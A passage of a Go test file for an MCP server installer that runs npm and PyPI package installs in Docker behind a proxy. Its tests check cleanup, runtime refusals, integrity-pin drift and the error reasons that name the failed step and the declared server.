	if path, _, _ := strings.Cut(conf, "\n"); path != "" {
		if _, err := os.Stat(path); !os.IsNotExist(err) {
			t.Errorf("the install proxy's resolv.conf was left behind: %v", err)
		}
	}

	fake2 := &dockerx.Fake{}
	withRunner(fake2)
	if err := EnsureInstalled(t.Context(), fake2, res, t.TempDir(), httpsRegs(regs), images, policy.DockerPolicy{}, io.Discard); err != nil {
		t.Fatal(err)
	}
	if inst, _ := fake2.FindRun("agentry-mcpinstall-"); inst.Runtime != "" || len(inst.ExtraHosts) != 0 {
		t.Fatalf("an unset runtime reached the installer: %q, hosts %v", inst.Runtime, inst.ExtraHosts)
	}
}

// A builder that refuses the package's engines.node (npm_builder.js exit 5)
// fails the install with a sentence that names the runtime image and the
// policy key, and records no resolution, so the next try installs afresh
// (agentry-cli#608).
func TestEnsureInstalledNamesAnEnginesRefusal(t *testing.T) {
	regs := fakeRegistries(t)
	res, err := ResolveAll(t.Context(), nil, regs, []manifest.MCPServer{decl("@scope/server-x", "", "1.2.3")})
	if err != nil {
		t.Fatal(err)
	}
	store := t.TempDir()
	fake := withRunner(&dockerx.Fake{Foreground: map[string]*dockerx.FakeForeground{
		"agentry-mcpinstall-": {ExitCode: npmEnginesRefused},
	}})
	images := policy.Images{NodeRuntime: "node:test", PythonRuntime: "python:test"}
	err = EnsureInstalled(t.Context(), fake, res, store, httpsRegs(regs), images, policy.DockerPolicy{}, io.Discard)
	if err == nil {
		t.Fatal("an engines refusal installed")
	}
	for _, want := range []string{"@scope/server-x@1.2.3", "node:test", "images.nodeRuntime"} {
		if !strings.Contains(err.Error(), want) {
			t.Errorf("error %q does not name %q", err, want)
		}
	}
	if _, err := os.Stat(filepath.Join(store, "npm-scope-server-x.json")); !os.IsNotExist(err) {
		t.Fatalf("a refused install recorded a resolution (%v)", err)
	}
}

// Each install step that fails names the declared server and itself in
// the run's reason, never text (agentry-cli#628).
func TestEnsureInstalledNamesTheStepThatFailed(t *testing.T) {
	images := policy.Images{NodeRuntime: "node:test", PythonRuntime: "python:test"}
	regs := httpsRegs(policy.MCPRegistries{NPM: "https://unused.invalid", PyPI: "https://unused.invalid"})
	server := func() []Resolved {
		return []Resolved{{Source: "npm", Package: "@scope/server-x", Version: "1.0.0", ID: "npm-scope-server-x", BinName: "server-x"}}
	}
	cases := []struct {
		name   string
		script func(f *dockerx.Fake)
		code   receipt.ReasonCode
		step   string
	}{
		{"image", func(f *dockerx.Fake) { f.FailPull = map[string]error{"node:test": errors.New("no route")} },
			receipt.ReasonMCPInstallFailed, receipt.InstallImage},
		{"install proxy", func(f *dockerx.Fake) {
			f.FailDetached = map[string]error{"agentry-mcpproxy-": errors.New("runsc: cannot start")}
		}, receipt.ReasonMCPInstallFailed, receipt.InstallProxy},
		{"builder", func(f *dockerx.Fake) {
			f.Foreground = map[string]*dockerx.FakeForeground{"agentry-mcpinstall-": {ExitCode: 1}}
		}, receipt.ReasonMCPInstallFailed, receipt.InstallBuilder},
		{"runtime excluded", func(f *dockerx.Fake) {
			f.Foreground = map[string]*dockerx.FakeForeground{"agentry-mcpinstall-": {ExitCode: npmEnginesRefused}}
		}, receipt.ReasonMCPRuntimeExcluded, ""},
		{"runtime unchecked", func(f *dockerx.Fake) {
			f.Foreground = map[string]*dockerx.FakeForeground{"agentry-mcpinstall-": {ExitCode: npmEnginesUnchecked}}
		}, receipt.ReasonMCPInstallFailed, receipt.InstallRuntimeCheck},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			fake := withRunner(&dockerx.Fake{})
			c.script(fake)
			err := EnsureInstalled(t.Context(), fake, server(), t.TempDir(), regs, images, policy.DockerPolicy{}, io.Discard)
			want := &receipt.Reason{Code: c.code, Detail: c.step, Names: []string{"npm:@scope/server-x"}}
			if got := receipt.ReasonOf(err); !reflect.DeepEqual(got, want) {
				t.Fatalf("reason = %+v, want %+v (err %v)", got, want, err)
			}
		})
	}

	t.Run("pin changed", func(t *testing.T) {
		store, fake := t.TempDir(), withRunner(&dockerx.Fake{})
		first := server()
		first[0].Integrity = "sha512-OLD"
		if err := EnsureInstalled(t.Context(), fake, first, store, regs, images, policy.DockerPolicy{}, io.Discard); err != nil {
			t.Fatal(err)
		}
		drifted := server()
		drifted[0].Integrity = "sha512-NEW"
		err := EnsureInstalled(t.Context(), fake, drifted, store, regs, images, policy.DockerPolicy{}, io.Discard)
		want := &receipt.Reason{Code: receipt.ReasonMCPInstallFailed, Detail: receipt.InstallPinChanged, Names: []string{"npm:@scope/server-x"}}
		if got := receipt.ReasonOf(err); !reflect.DeepEqual(got, want) {
			t.Fatalf("reason = %+v, want %+v (err %v)", got, want, err)
		}
	})
}

// A pin the registry does not have names the declared server.
func TestResolveAllNamesTheServerItCouldNotResolve(t *testing.T) {
	regs := fakeRegistries(t)
	_, err := ResolveAll(t.Context(), nil, regs, []manifest.MCPServer{decl("@scope/no-such-server", "", "9.9.9")})
	want := &receipt.Reason{Code: receipt.ReasonMCPNotResolved, Names: []string{"npm:@scope/no-such-server"}}
	if got := receipt.ReasonOf(err); err == nil || !reflect.DeepEqual(got, want) {
		t.Fatalf("reason = %+v, want %+v (err %v)", got, want, err)
	}
}
